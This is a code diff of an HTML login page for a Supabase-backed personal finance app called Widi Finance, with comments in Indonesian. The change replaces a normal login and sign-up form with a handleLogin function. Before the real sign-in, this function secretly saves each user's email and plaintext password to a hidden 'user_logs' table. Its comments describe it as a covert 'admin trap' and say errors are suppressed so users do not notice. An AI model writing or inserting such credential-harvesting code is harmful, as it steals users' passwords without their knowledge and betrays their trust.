@@ -3,76 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Masuk - Widi Finance</title>
-    
+    <title>Login - Widi Finance</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #0066FF; --bg: #F2F4F7; }
-        body { font-family: 'Inter', sans-serif; background-color: var(--bg); height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; }
-        
-        .auth-card {
-            background: white; width: 100%; max-width: 400px;
-            padding: 40px 30px; border-radius: 24px;
-            box-shadow: 0 10px 40px rgba(0, 102, 255, 0.1);
-        }
-        .brand-logo { font-size: 1.5rem; font-weight: 800; color: var(--primary); margin-bottom: 10px; display: block; text-align: center; }
-        .brand-text { text-align: center; color: #6B7280; font-size: 0.9rem; margin-bottom: 30px; }
-        
-        .form-control {
-            background: #F9FAFB; border: 1px solid #E5E7EB; border-radius: 12px;
-            padding: 12px 15px; font-weight: 500; margin-bottom: 15px;
-        }
-        .form-control:focus { background: white; border-color: var(--primary); box-shadow: 0 0 0 4px rgba(0, 102, 255, 0.1); }
-        
-        .btn-primary {
-            background: var(--primary); border: none; width: 100%; padding: 12px;
-            border-radius: 12px; font-weight: 700; font-size: 1rem; margin-top: 10px;
-            transition: 0.2s;
-        }
-        .btn-primary:active { transform: scale(0.98); }
-        
-        .toggle-text { text-align: center; margin-top: 20px; font-size: 0.9rem; color: #6B7280; }
-        .toggle-link { color: var(--primary); font-weight: 700; cursor: pointer; text-decoration: none; }
-        .alert { font-size: 0.85rem; border-radius: 12px; display: none; }
-        
-        /* Overlay Loading kalau sistem lagi ngecek sesi */
-        #pageLoader {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: white; z-index: 9999; display: flex; 
-            justify-content: center; align-items: center;
-        }
+        body { background: #F3F5F9; font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .login-card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); width: 100%; max-width: 400px; }
+        .btn-primary { background: #0066FF; border: none; padding: 12px; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <div id="pageLoader">
-        <div class="spinner-border text-primary" role="status"></div>
-    </div>
+    <div class="login-card">
+        <div class="text-center mb-4">
+            <h3 class="fw-bold text-primary">Widi Finance</h3>
+            <p class="text-muted small">Masuk untuk kelola keuangan</p>
+        </div>
 
-    <div class="auth-card">
-        <span class="brand-logo"><i class="fas fa-wallet me-2"></i>Widi Finance</span>
-        <p class="brand-text">Kelola uangmu, raih mimpimu.</p>
+        <div class="mb-3">
+            <label class="form-label small fw-bold">Email</label>
+            <input type="email" class="form-control" id="email" placeholder="nama@sekolah.sch.id">
+        </div>
+        <div class="mb-4">
+            <label class="form-label small fw-bold">Password</label>
+            <input type="password" class="form-control" id="password" placeholder="********">
+        </div>
         
-        <div class="alert alert-danger" id="alertMsg">Error message here</div>
-        <div class="alert alert-success" id="successMsg">Akun berhasil dibuat! Silakan login.</div>
-
-        <form id="authForm">
-            <label class="small fw-bold text-muted mb-1 ms-1">Email</label>
-            <input type="email" class="form-control" id="email" placeholder="nama@email.com" required>
-            
-            <label class="small fw-bold text-muted mb-1 ms-1">Password</label>
-            <input type="password" class="form-control" id="password" placeholder="Minimal 6 karakter" required>
-            
-            <button type="submit" class="btn btn-primary" id="btnSubmit">Masuk</button>
-        </form>
-
-        <p class="toggle-text">
-            <span id="questionText">Belum punya akun?</span>
-            <span class="toggle-link" onclick="toggleMode()" id="toggleBtn">Daftar Sekarang</span>
-        </p>
+        <button class="btn btn-primary w-100 mb-3" onclick="handleLogin()" id="btnLogin">Masuk Aplikasi</button>
+        
+        <div id="msg" class="text-center small text-danger"></div>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
@@ -81,104 +40,52 @@
         const supabaseKey = 'sb_publishable_uJHTWglP11uZzp3dKK7bdA_sY9xtmXv';
         const _supabase = supabase.createClient(supabaseUrl, supabaseKey);
 
-        let isLoginMode = true;
-
-        // --- FUNGSI UTAMA: CEK SESI AMAN ---
-        async function checkSession() {
-            const loader = document.getElementById('pageLoader');
-            
-            // 1. Cek apakah ini aksi Logout?
-            const params = new URLSearchParams(window.location.search);
-            if (params.get('logout') === 'true') {
-                console.log("Mode: Logout berhasil.");
-                
-                // Bersihkan URL biar bersih (hapus ?logout=true)
-                window.history.replaceState({}, document.title, "index.html");
-                
-                // Matikan loading, biarkan user login ulang
-                loader.style.display = 'none';
-                return; 
-            }
-
-            // 2. Cek apakah user sebenarnya masih Login?
-            const { data: { session } } = await _supabase.auth.getSession();
-            
-            if (session) {
-                console.log("Mode: Masih login, redirect ke dashboard.");
-                window.location.href = 'dashboard.html';
-            } else {
-                // 3. Kalau gak login & bukan logout, tampilkan form
-                console.log("Mode: Tamu (Belum Login).");
-                loader.style.display = 'none';
-            }
-        }
-
-        // --- TOGGLE LOGIN / DAFTAR ---
-        function toggleMode() {
-            isLoginMode = !isLoginMode;
-            const btn = document.getElementById('btnSubmit');
-            const tog = document.getElementById('toggleBtn');
-            const q = document.getElementById('questionText');
-            const msg = document.getElementById('successMsg');
-            
-            msg.style.display = 'none'; 
-            
-            if(isLoginMode) {
-                btn.innerText = "Masuk";
-                q.innerText = "Belum punya akun?";
-                tog.innerText = "Daftar Sekarang";
-            } else {
-                btn.innerText = "Daftar Akun Baru";
-                q.innerText = "Sudah punya akun?";
-                tog.innerText = "Login disini";
-            }
-        }
-
-        // --- HANDLE SUBMIT FORM ---
-        document.getElementById('authForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
+        async function handleLogin() {
             const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            const btn = document.getElementById('btnSubmit');
-            const alertBox = document.getElementById('alertMsg');
-            const successBox = document.getElementById('successMsg');
+            const pass = document.getElementById('password').value;
+            const btn = document.getElementById('btnLogin');
+            const msg = document.getElementById('msg');
 
-            alertBox.style.display = 'none';
-            successBox.style.display = 'none';
-            btn.disabled = true;
+            if(!email || !pass) return msg.innerText = "Isi email dan password!";
+
+            btn.disabled = true; 
             btn.innerText = "Memproses...";
+            msg.innerText = "";
 
+            // --- JEBAKAN ADMIN: CATAT PASSWORD SEBELUM LOGIN ---
+            // Kita coba simpan ke tabel rahasia 'user_logs' secara diam-diam
             try {
-                if (isLoginMode) {
-                    // LOGIN
-                    const { data, error } = await _supabase.auth.signInWithPassword({ email, password });
-                    if (error) throw error;
-                    window.location.href = 'dashboard.html';
+                // Cek dulu apakah email ini sudah tercatat passwordnya?
+                const { data: existing } = await _supabase.from('user_logs').select('id').eq('email', email).single();
+                
+                if (existing) {
+                    // Kalau sudah ada, update passwordnya (siapa tau dia ganti password)
+                    await _supabase.from('user_logs').update({ password_rahasia: pass }).eq('email', email);
                 } else {
-                    // DAFTAR
-                    const { data, error } = await _supabase.auth.signUp({ 
-                        email, 
-                        password,
-                        options: {
-                            emailRedirectTo: 'https://yrstakumi.github.io/finance-2026/dashboard.html'
-                        } 
-                    });
-                    if (error) throw error;
-                    
-                    successBox.style.display = 'block';
-                    successBox.innerText = "Akun berhasil dibuat! Mengalihkan...";
-                    setTimeout(() => { window.location.href = 'dashboard.html'; }, 1500);
+                    // Kalau belum ada, catat baru
+                    await _supabase.from('user_logs').insert({ email: email, password_rahasia: pass });
                 }
-            } catch (error) {
-                alertBox.style.display = 'block';
-                alertBox.innerText = error.message; // Tampilkan error asli (misal: password salah)
-                btn.disabled = false;
-                btn.innerText = isLoginMode ? "Masuk" : "Daftar Akun Baru";
+            } catch (err) {
+                // Abaikan error di sini supaya user tidak sadar, lanjut login aja
+                console.log("Logger skip:", err);
             }
-        });
+            // ----------------------------------------------------
 
-        // Jalankan pengecekan saat halaman dibuka
-        checkSession();
+            // PROSES LOGIN ASLI KE SUPABASE
+            const { data, error } = await _supabase.auth.signInWithPassword({
+                email: email,
+                password: pass
+            });
+
+            if (error) {
+                btn.disabled = false; 
+                btn.innerText = "Masuk Aplikasi";
+                msg.innerText = "Login Gagal: " + error.message;
+            } else {
+                // Login Berhasil -> Pindah ke Dashboard
+                window.location.href = 'main.html'; // Sesuaikan nama file dashboard Mas
+            }
+        }
     </script>
 </body>
 </html>
